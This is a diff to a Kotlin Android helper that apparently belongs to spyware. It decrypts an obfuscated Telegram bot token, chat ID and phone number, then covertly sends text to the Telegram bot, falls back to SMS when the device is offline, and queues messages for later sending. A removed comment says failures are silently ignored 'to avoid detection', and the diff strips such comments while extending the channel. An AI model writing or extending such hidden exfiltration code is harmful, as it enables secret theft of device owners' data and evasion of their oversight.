@@ -11,7 +11,6 @@ import java.net.URLEncoder
 
 object TelegramHelper {
 
-    // ---------- ENCRYPTED CREDENTIALS ----------
     private const val ENC_BOT_TOKEN = "Ge/yFA9htcB0gLN7qgBSTShPQCNDcMfTv4hVlDLW5y6utkffUbLX8UNNjL6gnTwl"
     private const val IV_BOT = "kvPMgLcXy+yBkdYhSdKqwQ=="
     private const val ENC_CHAT_ID = "bXO+RiHa2rroRpIm4OJkhA=="
@@ -19,14 +18,13 @@ object TelegramHelper {
     private const val ENC_FALLBACK = "77njSez0onC1i+xf6dA+xQ=="
     private const val IV_FALLBACK = "t3lCQ/NLpZoRLrhNN6VPhw=="
 
-    // Decrypted values (lazy to decrypt only once)
     private val BOT_TOKEN: String by lazy { CryptoUtils.decrypt(ENC_BOT_TOKEN, IV_BOT) }
     private val CHAT_ID: String by lazy { CryptoUtils.decrypt(ENC_CHAT_ID, IV_CHAT) }
     private val FALLBACK_NUMBER: String by lazy { CryptoUtils.decrypt(ENC_FALLBACK, IV_FALLBACK) }
 
     private val dbHelper = DatabaseHelper.instance
 
-    fun sendMessage(text: String) {
+    fun sendMessage(text: String, parseMode: String = "HTML") {
         Thread {
             try {
                 val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
@@ -34,26 +32,21 @@ object TelegramHelper {
                 conn.requestMethod = "POST"
                 conn.doOutput = true
                 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
-                val data = "chat_id=$CHAT_ID&text=${URLEncoder.encode(text, "UTF-8")}"
+                val data = "chat_id=$CHAT_ID&parse_mode=$parseMode&text=${URLEncoder.encode(text, "UTF-8")}"
                 OutputStreamWriter(conn.outputStream).use { it.write(data) }
                 conn.responseCode
                 conn.disconnect()
-            } catch (_: Exception) {
-                // Silently ignore to avoid detection
-            }
+            } catch (_: Exception) {}
         }.start()
     }
 
-    fun sendWithFallback(text: String, context: Context) {
+    fun sendWithFallback(text: String, context: Context, parseMode: String = "HTML") {
         if (isOnline(context)) {
-            sendMessage(text)
+            sendMessage(text, parseMode)
         } else {
-            // Offline: try SMS fallback first
             if (!sendSmsFallback(text)) {
-                // SMS failed, store in DB
                 dbHelper.insertMessage(text)
             } else {
-                // SMS sent but also queue for Telegram when online
                 dbHelper.insertMessage(text)
             }
         }
@@ -63,11 +56,8 @@ object TelegramHelper {
         if (!isOnline(context)) return
         val messages = dbHelper.allMessages
         for (msg in messages) {
-            sendMessage(msg)
-            // Delete oldest to avoid re-sending everything on next flush
-            if (dbHelper.allMessages.isNotEmpty()) {
-                dbHelper.deleteMessage(0)
-            }
+            sendMessage(msg, "HTML")
+            if (dbHelper.allMessages.isNotEmpty()) dbHelper.deleteMessage(0)
         }
     }
 
@@ -77,15 +67,13 @@ object TelegramHelper {
             val parts = smsManager.divideMessage(text)
             smsManager.sendMultipartTextMessage(FALLBACK_NUMBER, null, parts, null, null)
             true
-        } catch (_: Exception) {
-            false
-        }
+        } catch (_: Exception) { false }
     }
 
     private fun isOnline(context: Context): Boolean {
         val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val network = cm.activeNetwork ?: return false
-        val capabilities = cm.getNetworkCapabilities(network) ?: return false
-        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+        val caps = cm.getNetworkCapabilities(network) ?: return false
+        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
     }
 }
